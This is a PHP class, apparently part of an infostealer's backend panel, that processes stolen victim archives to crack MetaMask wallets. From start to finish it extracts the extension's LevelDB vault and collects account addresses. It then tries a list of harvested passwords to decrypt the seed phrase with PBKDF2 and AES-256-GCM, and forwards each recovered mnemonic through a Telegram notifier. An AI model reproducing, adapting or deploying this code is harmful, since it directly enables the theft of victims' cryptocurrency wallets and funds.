<?php

class MetaMask
{
    public function __construct($connection, $log, $passwords, $telegramManager)
    {
        $metamask = $log->log_info['plugins']['MetaMask'];

        foreach ($metamask as $browser => $browserData) 
        {
            if (!is_array($browserData)) 
            {
                continue;
            }

            $firstProfile = reset($browserData);

            if (is_array($firstProfile) && isset($firstProfile['files'])) 
            {
                foreach ($browserData as $profileName => $profileData) 
                {
                    if(isset($metamask[$browser][$profileName]["files"]["Local Extension Settings"]))
                    {
                        $files = $metamask[$browser][$profileName]["files"]["Local Extension Settings"];

                        $path = "plugins\\MetaMask\\".$browser."\\".$profileName."\\Local Extension Settings\\";

                        $log->log_info["cron_metamask"] = $path;

                        $tempDir = '/var/www/temp/' . $this->generateRandomString(10) . '/';

                        if (mkdir($tempDir, 0755, true)) 
                        {
                            $zip_path = "/var/www/html/".LOGS_PATH."/". basename($log->filename);

                            $this->Unzip($zip_path, $path, $tempDir);

                            try
                            {
                                $db = new LevelDB($tempDir);

                                $key = 'data';
                                $value = $db->get($key);

                                if ($value != false) 
                                {
                                    $parsed_db = json_decode($value, true);
                                    $encrypted = json_decode($parsed_db["KeyringController"]["vault"], true);

                                    $accounts = array();
                                    $networks_added = array();

                                    // address
                                    foreach($parsed_db["AccountsController"]["internalAccounts"]["accounts"] as $account)
                                    {
                                        array_push($accounts, $account["address"]);
                                    }

                                    // networks_added
                                    foreach($parsed_db["MetaMetricsController"]["previousUserTraits"]["networks_added"] as $network)
                                    {
                                        array_push($networks_added, $network);
                                    }

                                    $log->log_info["plugins"]["MetaMask"][$browser][$profileName]["address"] = $accounts;
                                    $log->log_info["plugins"]["MetaMask"][$browser][$profileName]["networks_added"] = $networks_added;

                                    foreach ($passwords as $password)
                                    {
                                        try
                                        {
                                            $seedPhrase = $this->decryptSeedPhraseGCM($encrypted["data"], $encrypted["iv"], $encrypted["salt"], $password, $encrypted["keyMetadata"]["params"]["iterations"]);

                                            if($seedPhrase != false)
                                            {
                                                $decrypted_seed = json_decode($seedPhrase, true);
                                                $mnemonicData = $decrypted_seed[0]['data']['mnemonic'];

                                                $mnemonic = $this->processMnemonic($mnemonicData);

                                                $log->log_info["mnemonic"]++;

                                                $log->log_info["plugins"]["MetaMask"][$browser][$profileName]["mnemonic"] = $mnemonic;
                                                $log->log_status = 3;

                                                $telegramManager->SendNotifyMnemonic($log, "MetaMask", $browser, $profileName, $mnemonic);
                                            }
                                        }
                                        catch (LevelDBException $e) 
                                        {
                                            
                                        }
                                    }
                                }
                            }
                            catch (LevelDBException $e) 
                            {

                            }
                        }

                        $this->deleteFolder($tempDir);
                    }
                }
            }
        }
    }

    public function Unzip($zipPath, $folder, $to)
    {
        $zip = new ZipArchive;

        if ($zip->open($zipPath) === TRUE)
        {
            for ($i = 0; $i < $zip->numFiles; $i++) 
            {
                $entry = $zip->getNameIndex($i);

                if (strpos($entry, $folder) === 0)
                {
                    $relativePath = substr($entry, strlen($folder));

                    if ($relativePath === '' || substr($entry, -1) === '/') 
                    {
                        continue;
                    }

                    $targetPath = $to . $relativePath;

                    $targetDir = dirname($targetPath);

                    if (!is_dir($targetDir)) 
                    {
                        mkdir($targetDir, 0755, true);
                    }

                    $fileContents = $zip->getFromIndex($i);

                    if ($fileContents !== false) 
                    {
                        file_put_contents($targetPath, $fileContents);
                    }
                }
            }
        }

        $zip->close();
    }

    public function generateRandomString($length = 10) 
    {
        return substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, $length);
    }

    public function decryptSeedPhraseGCM($encryptedData, $iv, $salt, $password, $iterations) 
    {
        $encryptedData = base64_decode($encryptedData);
        $iv = base64_decode($iv);
        $salt = base64_decode($salt);
    
        if ($encryptedData === false || $iv === false || $salt === false) 
        {
            return;
        }
    
        $tagLength = 16;
        $tag = substr($encryptedData, -$tagLength);
        $ciphertext = substr($encryptedData, 0, -$tagLength);
    
        $key = hash_pbkdf2('sha256', $password, $salt, $iterations, 32, true);
    
        if ($key === false) 
        {
            return false;
        }
    
        $decryptedData = openssl_decrypt($ciphertext, 'aes-256-gcm', $key, OPENSSL_RAW_DATA, $iv, $tag);
    
        if ($decryptedData === false) 
        {
            return false;
        }
    
        return $decryptedData;
    }

    public function processMnemonic($mnemonicData) 
    {
        $mnemonic = '';
    
        if (is_array($mnemonicData)) 
        {
            foreach ($mnemonicData as $number) 
            {
                $mnemonic .= chr($number);
            }
        }
        else if (is_string($mnemonicData)) 
        {
            $mnemonic = $mnemonicData;
        } 
        else 
        {
            return "ERROR_INCORRECT_FORMAT";
        }
    
        return $mnemonic;
    }

    public function deleteFolder($folder) 
    {
        if (!file_exists($folder)) {
            return true;
        }
        
        if (!is_dir($folder)) {
            return unlink($folder);
        }
        
        foreach (scandir($folder) as $item) {
            if ($item == '.' || $item == '..') {
                continue;
            }
            if (!$this->deleteFolder($folder . DIRECTORY_SEPARATOR . $item)) {
                return false;
            }
        }
        
        return rmdir($folder);
    }
}

?>